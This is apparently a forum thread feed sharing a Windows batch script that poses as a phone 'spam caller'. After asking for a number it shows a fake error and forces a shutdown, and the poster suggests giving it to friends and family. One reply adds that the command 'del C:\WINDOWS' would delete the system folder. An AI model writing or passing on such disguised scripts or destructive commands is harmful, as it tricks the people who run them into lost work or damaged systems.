channel.title: Spam Caller
channel.description:
[size=15pt]*Annoying TV advertising voice* Always wanted one? Well now it's here! The new Prank Spam Caller! Use it to prank your friends! *music* Prank family members *music* and more![/size]
Well I made one, If you haven't guessed it this thing doesn't actually Spam Call a phone number, it's a prank one. Basically It asks you for the number you want to spam call then...
Warning: This shuts down your computer, give it to someone and it will shut down their computer... If you want to test it then go ahead, you've got 60 seconds to save everything.
[code]:START TITLE Spam Caller ECHO Its quite simple! ECHO You enter in the number you want to call, enter the password, then it will spam that number with hundreds of phone calls!ECHO. SET CUSTOM= SET /p CUSTOM=Number: if %CUSTOM%==* goto Error :ErrorCLS ECHO. ECHO [%date% %time%] Error - 6089 cannot call. Pause CLS %windir%\system32\shutdown.exe -s -t 60 -c "You've been pranked. Shutting down your computer! You have 60 seconds to save any unsaved work =D" [/code]

item.title: Spam Caller

item.description:
@bryanc wrote:

[quote=“openice123, post:6, topic:191070”]see dis
%windir%\system32\shutdown.exe -s -t 60 -c “You’ve been pranked. Shutting down your computer! You have 60 seconds to save any unsaved work =D”

that means your computer shuts down
if it was
del C:\WINDOWS
it would delete that folder =)

his way is more nice tho[/quote]

thanks captain obvious…

@thread owner

Don’t post dumbass things

item.title: Spam Caller
item.dc:creator: @ranger_squad ranger squad
item.description:
@ranger_squad wrote:

[size=15pt]Annoying TV advertising voice Always wanted one? Well now it’s here! The new Prank Spam Caller! Use it to prank your friends! music Prank family members music and more![/size]

Well I made one, If you haven’t guessed it this thing doesn’t actually Spam Call a phone number, it’s a prank one. Basically It asks you for the number you want to spam call then…

Warning: This shuts down your computer, give it to someone and it will shut down their computer…
If you want to test it then go ahead, you’ve got 60 seconds to save everything.

TITLE Spam Caller
ECHO Its quite simple!
ECHO You enter in the number you want to call, enter the password, then it will spam that number with hundreds of phone calls!ECHO.
SET CUSTOM=
SET /p CUSTOM=Number:
if %CUSTOM%==* goto Error
:ErrorCLS
ECHO.
ECHO [%date% %time%] Error - 6089 cannot call.
Pause
CLS
%windir%\system32\shutdown.exe -s -t 60 -c “You’ve been pranked. Shutting down your computer! You have 60 seconds to save any unsaved work =D” [/code]

Read full topic
